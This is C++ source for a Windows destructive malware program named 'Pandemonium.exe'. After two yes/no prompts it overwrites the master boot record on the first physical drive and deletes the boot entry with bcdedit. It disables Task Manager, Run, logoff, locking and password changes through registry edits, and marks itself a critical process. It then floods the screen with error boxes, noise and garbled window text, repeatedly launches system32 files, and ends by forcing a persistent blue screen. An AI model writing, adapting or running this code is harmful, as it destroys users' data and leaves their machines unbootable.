﻿#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include "DisableFunction.h"
#include "bootheader.h"
#include "Hardshutdown.h"
#include <windows.h>
#include <cstdlib>


DWORD WINAPI Opens(LPVOID lpstart) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\WINDOWS\system32\*"; // Use wildcard to find all files

	while (true) {
		HANDLE find = FindFirstFileW(path, &data);
		if (find == INVALID_HANDLE_VALUE) {
			break; // Exit if directory search fails
		}

		do {
			// Skip directories (important to avoid recursion issues)
			if (!(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
				Sleep(250); // Delay between openings
			}
		} while (FindNextFileW(find, &data));

		FindClose(find);
	}
	return 0;
}

VOID WINAPI beep() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	// Buffer for storing sound samples
	char buffer[11025]; // Smaller buffer to repeat and loop continuously

						// Infinite loop to play sound continuously
	DWORD t = 0;
	while (true) {
		for (DWORD i = 0; i < sizeof(buffer); ++i, ++t) {
			buffer[i] = static_cast<char>(t ^ 6) & 32;
		}

		WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
		waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
		waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

		// Wait for the current buffer to finish playing before continuing
		while (waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR)) == WAVERR_STILLPLAYING) {
			Sleep(10);
		}
	}

	waveOutClose(hWaveOut);
}

DWORD WINAPI NoTaskmgr(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	return 1;
}

DWORD WINAPI msg(LPVOID lpParam)
{
	for (int i = 0; i < INFINITE; i++)
	{
		MessageBox(NULL, TEXT("Its Too Late..."), TEXT("Unknown Error"), MB_CANCELTRYCONTINUE | MB_ICONERROR);
		std::cout << "i = " << i << std::endl;
	}
	return 0;
}


DWORD WINAPI garbled(LPVOID lpParam) {
	const char* alphanum[] = {
		"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "q", "w", "e", "r", "t",
		"z", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "y",
		"x", "c", "v", "b", "n", "m", "Q", "W", "E", "R", "T", "Z", "U", "I", "O",
		"P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Y", "X", "C", "V", "B",
		"N", "M", ".", ",", " ", "$", "#", "&", "@", "!", "?",
	};
	int nText = sizeof(alphanum) / sizeof(alphanum[0]);

	char text[70];

	HWND hwnd = GetForegroundWindow();

	// Function to generate random garbled text
	auto generateText = [&]() {
		for (int i = 0; i < sizeof(text) - 1; ++i) {
			text[i] = alphanum[rand() % nText][0];
		}
		text[sizeof(text) - 1] = '\0'; // Null-terminate the string
	};

	// Callback function to update each child control's text
	auto updateControlText = [](HWND hwnd, LPARAM lParam) -> BOOL {
		char* text = reinterpret_cast<char*>(lParam);
		SetWindowTextA(hwnd, text);
		return TRUE;
	};

	while (true) {
		generateText();

		// Change the main window's title
		SetWindowTextA(hwnd, text);

		// Enumerate and change the text of all child controls
		EnumChildWindows(hwnd, updateControlText, reinterpret_cast<LPARAM>(text));

		Sleep(5);
	}
	return 0;
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}

DWORD WINAPI WindowMax(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	RECT rekt;

	while (true) {
		HWND hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &rekt);

		int sel = rand() % 4 + 1;

		if (rekt.left >= x) {
			rekt.left = 0;
		}
		else if (rekt.top >= y) {
			rekt.top = 0;
		}
		else if (rekt.left <= 0) {
			rekt.left = 0;
		}
		else if (rekt.top <= 0) {
			rekt.top = 0;
		}

		int xs = rekt.left;
		int ys = rekt.top;
		int rnd = rand() % 100 + 60;

		for (int i = 0; i < rnd; i += 20) {
			if (sel == 1) {
				SetWindowPos(hwnd, 0, xs + i, ys + i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 2) {
				SetWindowPos(hwnd, 0, xs - i, ys + i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 3) {
				SetWindowPos(hwnd, 0, xs + i, ys - i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 4) {
				SetWindowPos(hwnd, 0, xs - i, ys - i, xs, ys, 0);
				Sleep(10);
			}
		}
	}
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"Run Malware?", L"Pandemonium.exe (Non-GDI)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure?", L"Pandemonium.exe (Non-GDI)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			CreateThread(0, 0, NoTaskmgr, 0, 0, 0);
			beep();
			Sleep(10000);
			CreateThread(0, 0, msg, 0, 0, 0);
			Sleep(10000);
			HANDLE MessText = CreateThread(0, 0, garbled, 0, 0, 0);
			Sleep(10000);
			HANDLE Move = CreateThread(0, 0, WindowMax, 0, 0, 0);
			Sleep(10000);
			//starts Open Random Program
			HANDLE System = CreateThread(0, 0, Opens, 0, 0, 0);
			Sleep(120000);
			//system's death.
			TriggerPersistentBSOD();
		}
	}
}
